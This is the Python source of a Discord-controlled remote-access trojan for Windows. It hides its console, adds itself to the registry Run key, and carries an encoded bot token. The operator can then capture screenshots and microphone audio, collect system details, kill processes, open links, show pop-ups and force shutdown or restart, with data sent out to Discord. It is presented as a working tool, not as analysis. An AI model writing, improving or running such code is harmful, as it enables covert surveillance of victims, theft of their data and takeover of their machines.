import discord
from discord.ext import commands
from discord import Embed, Color
import os
import sys
import psutil
import datetime
import pyautogui
import webbrowser
import sounddevice as sd
import numpy as np
import wave
import asyncio
import ctypes
import winreg
import time
import msvcrt
import platform
import cpuinfo
import GPUtil
from screeninfo import get_monitors

TOKEN = base64.b64decode('TVRNMU5EVTROemcyTWpBeU1EQXdNVGsxTXcuR3F6dkVKLnE5Z3lzRGhadk1ILUczcF9kZGlSMUItOC1KVm1TbGt3LU5CTEkw').decode('utf-8')
MAIN_CHANNEL_ID = 1356968987099009089  

EMOJI_SUCCESS = "✅"
EMOJI_ERROR = "❌"
EMOJI_WARNING = "⚠️"
EMOJI_INFO = "ℹ️"
EMOJI_MIC = "🎤"
EMOJI_SCREEN = "🖥️"
EMOJI_SHUTDOWN = "⏏️"
EMOJI_RESTART = "🔄"

def hide_console():
    if sys.platform == 'win32':
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        hWnd = kernel32.GetConsoleWindow()
        if hWnd:
            user32.ShowWindow(hWnd, 0)

hide_console()

def prevent_multiple_instances():
    lock_file = os.path.join(os.environ['TEMP'], 'discord_bot.lock')
    try:
        if os.path.exists(lock_file):
            os.unlink(lock_file)
        fd = os.open(lock_file, os.O_CREAT | os.O_EXCL | os.O_RDWR)
        msvcrt.locking(fd, msvcrt.LK_NBLCK, 1)
    except (OSError, IOError):
        sys.exit()

prevent_multiple_instances()

def add_to_startup():
    if sys.platform == 'win32':
        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as regkey:
            winreg.SetValueEx(regkey, "DiscordBot", 0, winreg.REG_SZ, sys.executable + ' "' + os.path.abspath(__file__) + '"')

add_to_startup()

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
intents.voice_states = True
intents.guilds = True
bot = commands.Bot(command_prefix='!', intents=intents)

is_recording = False
audio_frames = []
user_channels = {}

async def get_or_create_user_channel(guild, username):
    channel_name = f"{username}-ctrl"

    if username in user_channels:
        return user_channels[username]

    for channel in guild.text_channels:
        if channel.name == channel_name:
            user_channels[username] = channel
            return channel

    try:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True)
        }

        new_channel = await guild.create_text_channel(
            channel_name,
            overwrites=overwrites,
            reason=f"Control channel for {username}"
        )

        user_channels[username] = new_channel
        return new_channel
    except Exception as e:
        print(f"Error creating channel: {e}")
        return None

@bot.event
async def on_ready():
    guild = bot.guilds[0] if bot.guilds else None
    if not guild:
        print("Bot is not in any guild!")
        return

    username = os.getlogin()
    user_channel = await get_or_create_user_channel(guild, username)

    if user_channel:

        embed = Embed(
            title=f"{EMOJI_INFO} System Online",
            description=f"Welcome {username}!\nSession started: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            color=Color.green()
        )
        await user_channel.send(embed=embed)

        main_channel = bot.get_channel(MAIN_CHANNEL_ID)
        if main_channel:
            embed = Embed(
                title=f"{EMOJI_INFO} New User Session",
                description=f"User: {username}\nControl channel: {user_channel.mention}",
                color=Color.blue()
            )
            await main_channel.send(embed=embed)

@bot.event
async def on_command(ctx):
    """Ensure commands are only processed in the user's dedicated channel"""
    username = os.getlogin()
    expected_channel_name = f"{username}-ctrl"

    if ctx.channel.name != expected_channel_name:

        user_channel = await get_or_create_user_channel(ctx.guild, username)
        if user_channel:
            embed = Embed(
                title=f"{EMOJI_WARNING} Wrong Channel",
                description=f"Please use your dedicated channel: {user_channel.mention}",
                color=Color.orange()
            )
            await ctx.send(embed=embed)
            return False
    return True

@bot.command(name='ss')
async def screenshot(ctx, mode='inside'):

    username = os.getlogin()
    if ctx.channel.name != f"{username}-ctrl":
        return

    try:
        if mode == 'inside':
            temp_dir = os.path.join(os.environ.get('TEMP', ''), 'discord_bot_screenshots')
            os.makedirs(temp_dir, exist_ok=True)

            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = os.path.join(temp_dir, f"screenshot_{timestamp}.png")

            try:
                pyautogui.screenshot(filename)
            except Exception as e:
                await ctx.send(f"{EMOJI_ERROR} Screenshot failed: {str(e)}")
                return

            try:
                with open(filename, 'rb') as f:
                    embed = Embed(
                        title=f"{EMOJI_SCREEN} Screenshot Captured",
                        description=f"Saved as: `{filename}`",
                        color=Color.green()
                    )
                    await ctx.send(embed=embed, file=discord.File(f, 'screenshot.png'))
            except discord.HTTPException as e:
                await ctx.send(f"{EMOJI_ERROR} Failed to send screenshot: {str(e)}")
                return

            try:
                os.remove(filename)
            except PermissionError:
                await ctx.send(f"{EMOJI_WARNING} Could not delete temporary file: {filename}")

        else:
            await ctx.send(f"{EMOJI_ERROR} Invalid mode. Use 'inside'")

    except Exception as e:
        await ctx.send(f"{EMOJI_ERROR} Unexpected error: {str(e)}")

@bot.command(name='sysinfo')
async def system_info(ctx):
    try:
        cpu_info = cpuinfo.get_cpu_info()
        cpu_name = cpu_info['brand_raw']
        cpu_cores = psutil.cpu_count(logical=False)
        cpu_threads = psutil.cpu_count(logical=True)
        cpu_usage = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        mem_total = round(mem.total / (1024 ** 3), 2)
        mem_used = round(mem.used / (1024 ** 3), 2)
        mem_percent = mem.percent
        disk = psutil.disk_usage('/')
        disk_total = round(disk.total / (1024 ** 3), 2)
        disk_used = round(disk.used / (1024 ** 3), 2)
        disk_percent = disk.percent
        gpus = GPUtil.getGPUs()
        gpu_info = []
        for gpu in gpus:
            gpu_info.append(f"{gpu.name} ({gpu.load*100:.1f}%)")
        monitors = get_monitors()
        monitor_info = []
        for m in monitors:
            monitor_info.append(f"{m.width}x{m.height} @ {m.width_mm}mm x {m.height_mm}mm")
        embed = Embed(title="System Information", color=Color.blue())
        embed.add_field(name="CPU", value=f"{cpu_name}\nCores: {cpu_cores} | Threads: {cpu_threads}\nUsage: {cpu_usage}%", inline=False)
        embed.add_field(name="Memory", value=f"Total: {mem_total}GB\nUsed: {mem_used}GB ({mem_percent}%)", inline=True)
        embed.add_field(name="Disk", value=f"Total: {disk_total}GB\nUsed: {disk_used}GB ({disk_percent}%)", inline=True)
        if gpu_info:
            embed.add_field(name="GPU", value="\n".join(gpu_info), inline=False)
        if monitor_info:
            embed.add_field(name="Monitors", value="\n".join(monitor_info), inline=False)
        embed.set_footer(text=f"System: {platform.system()} {platform.release()}")
        await ctx.send(embed=embed)
    except Exception as e:
        await ctx.send(f"{EMOJI_ERROR} Error getting system info: {str(e)}")

@bot.command(name='msg')
async def send_message(ctx, *, message):
    try:
        pyautogui.alert(message)
        await ctx.message.add_reaction(EMOJI_SUCCESS)
    except:
        await ctx.message.add_reaction(EMOJI_ERROR)

@bot.command(name='lp')
async def list_programs(ctx, page: int = 1):
    try:

        windows = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if proc.info['name'].endswith('.exe'):  
                    windows.append(f"PID: {proc.info['pid']} - {proc.info['name']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        if not windows:
            await ctx.send(f"{EMOJI_INFO} No foreground applications found")
            return

        per_page = 10
        total_pages = (len(windows) + per_page - 1) // per_page
        page = max(1, min(page, total_pages))
        start = (page - 1) * per_page
        end = start + per_page

        embed = Embed(title=f"Foreground Applications (Page {page}/{total_pages})", color=Color.blue())
        embed.description = "\n".join(windows[start:end])
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"{EMOJI_ERROR} Error: {str(e)}")

@bot.command(name='searchp')
async def search_process(ctx, *, search_term: str):
    try:
        found_processes = []
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                proc_name = proc.info['name'].lower()
                if search_term.lower() in proc_name:
                    found_processes.append(f"PID: {proc.info['pid']} - {proc.info['name']}")
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        if not found_processes:
            await ctx.send(f"{EMOJI_WARNING} No running processes found containing '{search_term}'")
            return

        embed = Embed(title=f"Processes containing '{search_term}'", 
                     color=Color.blue(),
                     description="\n".join(found_processes))
        await ctx.send(embed=embed)

    except Exception as e:
        await ctx.send(f"{EMOJI_ERROR} Error searching processes: {str(e)}")

@bot.command(name='ep')
async def end_program(ctx, pid: int):
    try:
        psutil.Process(pid).terminate()
        await ctx.message.add_reaction(EMOJI_SUCCESS)
    except:
        await ctx.message.add_reaction(EMOJI_ERROR)

@bot.command(name='shutdown')
async def shutdown_pc(ctx):
    try:
        embed = Embed(
            title=f"{EMOJI_SHUTDOWN} Shutdown Initiated",
            description="Computer will shutdown in 5 seconds...",
            color=Color.red()
        )
        await ctx.send(embed=embed)
        os.system("shutdown /s /t 5")
    except:
        await ctx.send(f"{EMOJI_ERROR} Failed to initiate shutdown")

@bot.command(name='vc')
async def voice_capture(ctx):
    global is_recording, audio_frames
    try:
        if ctx.author.voice:
            voice_client = await ctx.author.voice.channel.connect()
            is_recording = True
            audio_frames = []
            embed = Embed(
                title=f"{EMOJI_MIC} Voice Recording Started",
                description="Recording audio... Say `!stopvc` to stop",
                color=Color.green()
            )
            await ctx.send(embed=embed)
            def callback(indata, frames, time, status):
                if is_recording:
                    audio_frames.append(indata.copy())
            with sd.InputStream(callback=callback):
                while is_recording:
                    await asyncio.sleep(1)
            filename = f"recording_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
            with wave.open(filename, 'wb') as wf:
                wf.setnchannels(1)
                wf.setsampwidth(2)
                wf.setframerate(44100)
                wf.writeframes(b''.join(audio_frames))
            await ctx.send(file=discord.File(filename))
            os.remove(filename)
            await voice_client.disconnect()
        else:
            await ctx.send(f"{EMOJI_WARNING} You need to be in a voice channel first")
    except Exception as e:
        await ctx.send(f"{EMOJI_ERROR} Error: {str(e)}")

@bot.command(name='stopvc')
async def stop_voice_capture(ctx):
    global is_recording
    is_recording = False
    await ctx.message.add_reaction(EMOJI_SUCCESS)

@bot.command(name='sd')
async def self_destruct(ctx):
    embed = Embed(
        title="⚠️ SELF DESTRUCT INITIATED ⚠️",
        description="Bot will now terminate all operations",
        color=Color.red()
    )
    await ctx.send(embed=embed)
    await bot.close()
    sys.exit(0)

@bot.command(name='restart')
async def restart_pc(ctx):
    try:
        embed = Embed(
            title=f"{EMOJI_RESTART} Restart Initiated",
            description="Computer will restart in 5 seconds...",
            color=Color.orange()
        )
        await ctx.send(embed=embed)
        os.system("shutdown /r /t 5")
    except:
        await ctx.send(f"{EMOJI_ERROR} Failed to initiate restart")

@bot.command(name='troll')
async def open_link(ctx, link):
    try:
        webbrowser.open(link)
        await ctx.message.add_reaction(EMOJI_SUCCESS)
    except:
        await ctx.message.add_reaction(EMOJI_ERROR)

@bot.command(name='cmds')
async def show_help(ctx):
    embed = Embed(title="Bot Command Help", color=Color.blue())
    commands_list = [
        ("!ss [mode]", "Take screenshot (mode: inside)"),
        ("!msg <message>", "Show message on PC"),
        ("!lp <page>", "List running programs with page number"),
        ("!ep <pid>", "End process by PID"),
        ("!shutdown", "Shutdown the PC"),
        ("!vc", "Join VC and start recording"),
        ("!stopvc", "Stop recording and leave VC"),
        ("!sd", "Self destruct the bot"),
        ("!restart", "Restart the PC"),
        ("!troll <link>", "Open link in browser"),
        ("!sysinfo", "Show detailed system information")
    ]
    for cmd, desc in commands_list:
        embed.add_field(name=cmd, value=desc, inline=False)
    embed.set_footer(text="Use commands responsibly!")
    await ctx.send(embed=embed)

def restart_script():
    python = sys.executable
    os.execl(python, python, *sys.argv)

if __name__ == "__main__":
    while True:
        try:
            bot.run(TOKEN)
        except discord.LoginFailure:
            sys.exit(1)
        except Exception as e:
            time.sleep(5)
            restart_script()
